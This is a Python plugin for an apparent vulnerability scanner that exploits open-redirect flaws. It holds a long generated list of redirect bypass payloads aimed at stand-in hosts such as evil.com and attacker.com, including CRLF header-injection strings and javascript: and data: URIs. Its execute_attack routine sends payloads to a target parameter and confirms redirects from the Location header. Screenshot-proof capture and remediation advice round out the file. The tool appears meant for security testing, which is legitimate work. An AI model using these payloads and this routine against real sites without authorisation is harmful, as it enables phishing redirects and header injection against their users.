"""
Open Redirect Exploit Plugin

This plugin provides exploit capabilities for Open Redirect vulnerabilities.
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class OpenRedirectPlugin(ExploitPlugin):
    """Open Redirect exploit plugin."""
    
    @property
    def vulnerability_type(self) -> str:
        return 'open_redirect'
    
    @property
    def name(self) -> str:
        return 'Open Redirect Exploit'
    
    @property
    def description(self) -> str:
        return 'Open Redirect exploit plugin for testing redirect vulnerabilities.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate Open Redirect payloads."""
        context = context or {}
        target_domain = context.get('target_domain', 'evil.com')
        
        payloads = [
            f'http://{target_domain}',
            f'https://{target_domain}',
            f'//{target_domain}',
            f'http://{target_domain}/phishing',
            f'//{target_domain}/phishing',
            f'//{target_domain}@trusted.com',
            f'//trusted.com.{target_domain}',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            f'http://{target_domain}%2F@trusted.com',
            f'http://{target_domain}%00.trusted.com',
            f'http://{target_domain}%0a.trusted.com',
            f'http://%74%72%75%73%74%65%64%2E%63%6F%6D@{target_domain}',
            f'http://trusted.com.{target_domain}',
            f'http://trusted.com@{target_domain}',
            f'http://{target_domain}:80@trusted.com',
            f'javascript:window.location=\'http://{target_domain}\'',
            'javascript:alert(1)',
            f'http://{target_domain}%0d%0aSet-Cookie:redirect=1',
            f'////{target_domain}',
            f'//{target_domain}/%2F..',
            f'http://{target_domain}@trusted.com/path',
            f'http:{target_domain}',
            f'/%09//{target_domain}',
            f'//{target_domain}?trusted.com',
            f'\\\\{target_domain}',
            f'//{target_domain}\\trusted.com',
            f'http://{target_domain}:443',
            f'http://{target_domain}:8080',
            f'http://{target_domain}/../../',
            f'http://{target_domain}?https://trusted.com',
            f'http://{target_domain}#trusted.com',
            f'https://{target_domain}@trusted.com',
            f'/{target_domain}',
            f'/{target_domain}/path',
            f'http://127.0.0.1@{target_domain}',
            f'http://localhost@{target_domain}',
            f'http://{target_domain}%2e',
            f'http://{target_domain}%0d%0aX-Custom:evil',
            f'http://{target_domain}/%00',
            f'%2f%2f{target_domain}',
            f'%68%74%74%70%3a%2f%2f{target_domain}',
            f'http%3a%2f%2f{target_domain}',
            f'https%3a%2f%2f{target_domain}',
            f'///{target_domain}',
            f'http:///{target_domain}',
            f'http://{target_domain}\\@trusted.com',
            f'http://trusted.com\\@{target_domain}',
            f'/\\{target_domain}',
            f'javascript://{target_domain}/%0aalert(1)',
            f'data:text/html,<meta http-equiv=refresh content=0;url=http://{target_domain}>',
            f'http://{target_domain}?next=trusted.com',
            f'url=http://{target_domain}',
            f'next=http://{target_domain}',
            f'return=http://{target_domain}',
            f'redirect=http://{target_domain}',
            f'redir=http://{target_domain}',
            f'target=http://{target_domain}',
            f'dest=http://{target_domain}',
            f'destination=http://{target_domain}',
            f'go=http://{target_domain}',
            f'location=http://{target_domain}',
            f'from=http://{target_domain}',
            f'out=http://{target_domain}',
            f'view=http://{target_domain}',
            f'to=http://{target_domain}',
            f'link=http://{target_domain}',
            f'forward=http://{target_domain}',
            f'http://{target_domain}:80',
            f'http://{target_domain}:9090',
            f'http://{target_domain}/login',
            f'http://{target_domain}/admin',
            f'https://{target_domain}/evil',
            f'//{target_domain}:80',
            f'//{target_domain}:443',
            f'/////{target_domain}/path',
            f'http://{target_domain}%0d%0aLocation:http://evil.com',
        ]
        # Generate dynamic redirect payloads for all common parameter names
        param_names = ['url', 'next', 'return', 'redirect', 'redir', 'target', 'dest',
                       'destination', 'go', 'location', 'from', 'out', 'view', 'to',
                       'link', 'forward', 'continue', 'ref', 'returnUrl', 'nextUrl',
                       'redirectTo', 'returnTo', 'backUrl', 'successUrl', 'failUrl']
        dynamic_or = []
        for param in param_names:
            dynamic_or.append(f'{param}=http://{target_domain}')
            dynamic_or.append(f'{param}=https://{target_domain}')
            dynamic_or.append(f'{param}=//{target_domain}')
            dynamic_or.append(f'{param}=@{target_domain}')
        # Various bypass techniques for each protocol
        for bypass in [
            f'http://{target_domain}', f'https://{target_domain}', f'//{target_domain}',
            f'http://{target_domain}:80', f'http://{target_domain}:443',
            f'http://{target_domain}@trusted.com', f'http://trusted.com@{target_domain}',
            f'http://{target_domain}%2F@trusted.com', f'//{target_domain}@trusted.com',
            f'http://{target_domain}%00.trusted.com', f'http://{target_domain}%0a.trusted.com',
        ]:
            dynamic_or.append(bypass)
            dynamic_or.append(f'?url={bypass}')
            dynamic_or.append(f'?next={bypass}')
            dynamic_or.append(f'?redirect={bypass}')
        payloads.extend(dynamic_or)
        return PayloadMutator.scale_payloads_to_minimum(payloads)
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute Open Redirect attack with visual proof capture."""
        if not HAS_REQUESTS:
            return {'success': False, 'error': 'Requests library not available', 'vulnerability_type': 'open_redirect'}
        
        parameter = vulnerability_data.get('parameter')
        if not parameter:
            return {'success': False, 'error': 'No parameter specified', 'vulnerability_type': 'open_redirect'}
        
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        # Test redirect with various payloads
        payloads = [
            ('http://evil.com', 'evil.com'),
            ('https://malicious-site.com', 'malicious-site.com'),
            ('//attacker.com', 'attacker.com'),
        ]
        
        successful_redirect = None
        redirect_location = None
        
        for payload, domain in payloads:
            try:
                params = {parameter: payload}
                response = requests.get(target_url, params=params, timeout=timeout, verify=verify_ssl, allow_redirects=False)
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if domain in location:
                        successful_redirect = payload
                        redirect_location = location
                        logger.info(f"Open redirect confirmed with payload: {payload}")
                        break
            except Exception as e:
                logger.debug(f"Error testing payload {payload}: {e}")
        
        if successful_redirect:
            result = {
                'success': True,
                'evidence': f'Successful redirect to: {redirect_location}',
                'vulnerability_type': 'open_redirect',
                'message': 'Open redirect confirmed',
                'payload': successful_redirect,
                'redirect_location': redirect_location,
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(
                    target_url, parameter, successful_redirect, redirect_location, config
                )
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            # Generate unified proof report
            if config.get('enable_proof_reporting', True):
                self._generate_proof_report(result, target_url, vulnerability_data, config)
            
            return result
        
        return {'success': False, 'error': 'Could not exploit', 'vulnerability_type': 'open_redirect'}
    
    def _capture_visual_proof(self, url: str, parameter: str, payload: str,
                              redirect_location: str, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of Open Redirect exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            payload: Successful redirect payload
            redirect_location: Actual redirect location
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            
            # Build proof URL
            proof_url = f"{url}?{parameter}={payload}"
            
            # Capture screenshot showing the redirect headers
            screenshot_data = proof_capture.capture_screenshot(
                proof_url,
                wait_time=1.0
            )
            
            if screenshot_data:
                visual_proofs.append({
                    'type': 'screenshot',
                    'data': screenshot_data,
                    'title': 'Open Redirect - External Domain Redirect',
                    'description': f'Browser redirected to external malicious domain: {redirect_location}',
                    'exploit_step': f'Redirect triggered via payload: {payload}',
                    'payload': payload,
                    'redirect_location': redirect_location
                })
            
            # Capture a second screenshot after following redirect (if it's a safe test)
            # We'll use a safer test domain for this
            test_domain = 'example.com'
            test_payload = f'http://{test_domain}'
            test_proof_url = f"{url}?{parameter}={test_payload}"
            
            screenshot_data2 = proof_capture.capture_screenshot(
                test_proof_url,
                wait_time=2.0
            )
            
            if screenshot_data2:
                visual_proofs.append({
                    'type': 'screenshot',
                    'data': screenshot_data2,
                    'title': 'Open Redirect - Redirect Confirmation',
                    'description': f'Successfully redirected to external domain via vulnerable parameter',
                    'exploit_step': f'Test redirect to {test_domain} confirms vulnerability',
                    'payload': test_payload
                })
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """Verify open redirect with proof of successful redirection."""
        if not result.get('success'):
            return False, None
        
        redirect_url = result.get('redirect_url', '')
        evidence = result.get('evidence', '')
        
        # Verified if we successfully triggered a redirect
        if redirect_url:
            proof = f"âœ“ VERIFIED - Open Redirect\n\nRedirected to: {redirect_url}\nEvidence: {evidence[:200]}\n\nImpact: Users can be redirected to malicious sites"
            return True, proof
        
        return False, None
    
    def _generate_proof_report(self, result: Dict[str, Any], target_url: str,
                               vulnerability_data: Dict[str, Any], config: Dict[str, Any]) -> None:
        """
        Generate unified proof report using ProofReporter.
        
        Args:
            result: Exploitation result dictionary
            target_url: Target URL
            vulnerability_data: Vulnerability data
            config: Configuration dictionary
        """
        try:
            from scanner.proof_reporter import get_proof_reporter
            
            # Initialize proof reporter (visual proof enabled for Open Redirect)
            reporter = get_proof_reporter(enable_visual_proof=True)
            
            # Create proof data container
            vuln_id = vulnerability_data.get('vulnerability_id')
            proof_data = reporter.create_proof_data('open_redirect', vuln_id)
            
            # Set success status
            verified = result.get('success', False)
            proof_data.set_success(
                success=verified,
                verified=verified,
                confidence=0.85 if verified else 0.3
            )
            
            # Add HTTP request
            parameter = vulnerability_data.get('parameter')
            payload = result.get('payload', '')
            redirect_url = f"{target_url}?{parameter}={payload}"
            
            proof_data.add_http_request(
                method='GET',
                url=redirect_url,
                headers={'User-Agent': 'Megido Scanner'}
            )
            
            # Add HTTP response with redirect
            if result.get('redirect_location'):
                proof_data.add_http_response(
                    status_code=302,
                    headers={'Location': result['redirect_location']},
                    body=''
                )
            
            # Add exploitation logs
            proof_data.add_log(f"Open redirect test on {target_url}", 'info')
            proof_data.add_log(f"Vulnerable parameter: {parameter}", 'info')
            proof_data.add_log(f"Successful payload: {payload}", 'success')
            proof_data.add_log(f"Redirect location: {result.get('redirect_location')}", 'success')
            
            if result.get('evidence'):
                proof_data.add_log(result['evidence'], 'info')
            
            # Capture visual proof
            if config.get('enable_visual_proof', True):
                try:
                    reporter.capture_visual_proof(
                        proof_data,
                        redirect_url,
                        capture_type='screenshot'
                    )
                except Exception as e:
                    proof_data.add_log(f"Visual proof capture failed: {e}", 'warning')
            
            # Add visual proofs from legacy capture
            if result.get('visual_proofs'):
                for visual_proof in result['visual_proofs']:
                    proof_data.add_metadata(f'legacy_visual_proof_{visual_proof.get("type")}',
                                          visual_proof.get('description'))
            
            # Add metadata
            proof_data.add_metadata('target_url', target_url)
            proof_data.add_metadata('parameter', parameter)
            proof_data.add_metadata('payload', payload)
            proof_data.add_metadata('redirect_location', result.get('redirect_location'))
            proof_data.add_metadata('plugin_version', self.version)
            
            # Generate and save proof reports
            proof_results = reporter.report_proof(
                proof_data,
                save_json=config.get('save_proof_json', True),
                save_html=config.get('save_proof_html', True),
                store_db=config.get('store_proof_db', True),
                vulnerability_model=vulnerability_data.get('vulnerability_model')
            )
            
            # Add proof paths to result
            result['proof_json_path'] = proof_results.get('json_path')
            result['proof_html_path'] = proof_results.get('html_path')
            result['proof_db_stored'] = proof_results.get('db_stored')
            
            logger.info("Open Redirect proof reporting completed successfully")
            
        except ImportError:
            logger.warning("ProofReporter not available, skipping proof generation")
        except Exception as e:
            logger.error(f"Error generating proof report: {e}", exc_info=True)
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent Open Redirect attacks:\n'
            '1. Validate redirect URLs against whitelist\n'
            '2. Use relative URLs for redirects\n'
            '3. Implement redirect token validation\n'
            '4. Avoid user-controlled redirects\n'
            '5. Use indirect references\n'
            '6. Log and monitor redirects'
        )
